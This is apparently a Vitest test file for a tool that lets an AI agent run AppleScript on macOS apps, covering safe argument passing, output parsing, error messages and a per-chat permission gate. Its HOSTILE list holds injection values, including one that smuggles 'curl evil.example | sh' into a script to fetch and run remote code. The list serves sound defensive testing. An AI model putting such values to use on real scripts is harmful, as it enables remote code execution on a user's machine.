import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";

import { ChatIdSchema } from "../../schemas/chat-id";
import { StoreId } from "../../schemas/store-id";
import { chatLayout } from "../../test/helpers/chat-layout";
import { createMockChatConfig } from "../../test/helpers/mock-chat-config";
import { grantApp } from "../permissions/apps";
import { openAsks } from "../chat/open-asks";
import { setDenied } from "../permissions/denials";
import {
  listArgs,
  localIso,
  parseRecords,
  parseRecordWithText,
  runAppScript,
  scriptArgv,
} from "./app-scripts";

vi.mock("execa");

const US = "\u001f";
const RS = "\u001e";

/** Values an agent could pass that would change a script spliced into its text. */
const HOSTILE = [
  'Q3 "plan" & (do shell script "id")',
  '" & do shell script "curl evil.example | sh" & "',
  '«event sysoexec» given «class prmp»:"id"',
  'line one\nend run\non run argv\n\tdo shell script "id"',
  "-e",
  "-l JavaScript",
  "",
];

describe("scriptArgv", () => {
  const SCRIPT = "on run argv\n\treturn item 1 of argv\nend run\n";

  it("passes the script as it is and every value as one argv entry after --", () => {
    const argv = scriptArgv(SCRIPT, HOSTILE);
    expect(argv.slice(0, 3)).toEqual(["-e", SCRIPT, "--"]);
    expect(argv.slice(3)).toEqual(HOSTILE);
  });

  it("leaves the script the same whatever the values", () => {
    expect(scriptArgv(SCRIPT, HOSTILE)[1]).toBe(scriptArgv(SCRIPT, ["x"])[1]);
  });

  it("carries a list as its length, then its items", () => {
    expect(listArgs(["a@x.com", 'b"@y.com'])).toEqual([
      "2",
      "a@x.com",
      'b"@y.com',
    ]);
    expect(listArgs([])).toEqual(["0"]);
  });
});

describe("reading a script's answer", () => {
  it("splits records and fields on the ASCII separators", () => {
    expect(
      parseRecords(`1${US}iCloud${US}INBOX${RS}2${US}Work${US}Sent${RS}`),
    ).toEqual([
      ["1", "iCloud", "INBOX"],
      ["2", "Work", "Sent"],
    ]);
    expect(parseRecords("")).toEqual([]);
  });

  it("keeps a free-text last field whole, separators and all", () => {
    expect(
      parseRecordWithText(`a${US}b${US}body with ${US} and ${RS} in it`, 3),
    ).toEqual(["a", "b", `body with ${US} and ${RS} in it`]);
  });

  it("adds this computer's offset to a script's local time", () => {
    expect(localIso("2026-10-14T09:05:03")).toMatch(
      /^2026-10-14T09:05:03[+-]\d\d:\d\d$/,
    );
    expect(localIso("")).toBeNull();
  });
});

describe("runAppScript", () => {
  const chatId = createMockChatConfig(ChatIdSchema.parse("app-scripts-test"));
  const layout = chatLayout(chatId);
  const app = { bundleId: "com.apple.Notes", name: "Notes" };
  const run = (values: string[] = [], errors?: Record<number, string>) =>
    runAppScript({
      app,
      chatId,
      command: "notes",
      ...(errors && { errors }),
      layout,
      script: "on run argv\nend run\n",
      values,
    });

  async function answer(result: { exitCode: number; stderr?: string }) {
    const { execa } = await import("execa");
    vi.mocked(execa).mockResolvedValueOnce({
      all: "",
      stdout: Buffer.from(""),
      ...result,
      stderr: Buffer.from(result.stderr ?? ""),
    } as never);
    return execa;
  }

  beforeAll(async () => {
    await grantApp(chatId, "Notes");
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  it("runs the system osascript with the script and the values", async () => {
    const execa = await answer({ exitCode: 0 });
    await run(["Taco night"]);
    expect(vi.mocked(execa)).toHaveBeenCalledWith(
      "/usr/bin/osascript",
      ["-e", "on run argv\nend run\n", "--", "Taco night"],
      expect.objectContaining({ stdin: "ignore" }),
    );
  });

  it.each([
    [
      -1743,
      "execution error: Not authorized to send Apple events to Notes. (-1743)",
      2,
      "notes: macOS itself keeps Instrument out of Notes, not the person's settings. They now see a card that opens the setting, and their answer wakes you; stop here and say what you're waiting for.\n",
    ],
    [
      9013,
      "execution error: An error of type 9013 has occurred. (9013)",
      1,
      "notes: no such note\n",
    ],
    [
      -1728,
      'execution error: Notes got an error: Can’t get folder "Taxes". (-1728)',
      1,
      'notes: Can’t get folder "Taxes".\n',
    ],
  ])("says what error %i means", async (_code, stderr, exitCode, expected) => {
    await answer({ exitCode: 1, stderr: `12:40: ${stderr}\n` });
    expect(await run([], { 9013: "no such note" })).toEqual({
      exitCode,
      stderr: expected,
      stdout: "",
    });
  });
});

describe("the app gate", () => {
  const app = { bundleId: "com.apple.MobileSMS", name: "Messages" };
  const run = (
    chatId: ReturnType<typeof createMockChatConfig>,
    asks: boolean,
  ) => {
    const layout = chatLayout(chatId);
    return runAppScript({
      app,
      chatId,
      command: "messages",
      layout: asks
        ? {
            ...layout,
            rules: {
              ...layout.rules,
              asker: { chatId, sessionId: StoreId.newSessionId() },
            },
          }
        : layout,
      script: "on run argv\nend run\n",
      values: [],
    });
  };

  afterEach(() => {
    vi.resetAllMocks();
  });

  it("names the app to ask for, before anything runs", async () => {
    const { execa } = await import("execa");
    const chatId = createMockChatConfig(ChatIdSchema.parse("app-gate-ask"));
    const result = await run(chatId, true);

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe(
      "messages: refused: using Messages needs the person's yes. If the work needs it, ask for Messages with ask_permission.\n",
    );
    expect(await openAsks(chatId)).toEqual([]);
    expect(vi.mocked(execa)).not.toHaveBeenCalled();
  });

  it("refuses where no session can hear an answer", async () => {
    const chatId = createMockChatConfig(ChatIdSchema.parse("app-gate-none"));
    expect((await run(chatId, false)).stderr).toContain(
      "using Messages needs the person's yes first.",
    );
  });

  it("keeps a not now for the chat, under the app's name or its bundle id", async () => {
    const { execa } = await import("execa");
    for (const target of ["Messages", "com.apple.MobileSMS"]) {
      const chatId = createMockChatConfig(
        ChatIdSchema.parse(`app-gate-denied-${target.length}`),
      );
      await setDenied(chatId, "app", target, true);
      const result = await run(chatId, true);

      expect(result.stderr).toContain(
        "the person said not now to Messages in this chat. Don't look for another way to use it",
      );
      expect(await openAsks(chatId)).toEqual([]);
    }
    expect(vi.mocked(execa)).not.toHaveBeenCalled();
  });

  it("runs once the chat holds a grant, under the app's name or its bundle id", async () => {
    const { execa } = await import("execa");
    for (const target of ["Messages", "com.apple.MobileSMS"]) {
      vi.mocked(execa).mockResolvedValueOnce({
        all: "",
        exitCode: 0,
        stdout: Buffer.from(""),
      } as never);
      const chatId = createMockChatConfig(
        ChatIdSchema.parse(`app-gate-granted-${target.length}`),
      );
      await grantApp(chatId, target);
      expect((await run(chatId, true)).exitCode).toBe(0);
    }
    expect(vi.mocked(execa)).toHaveBeenCalledTimes(2);
  });
});
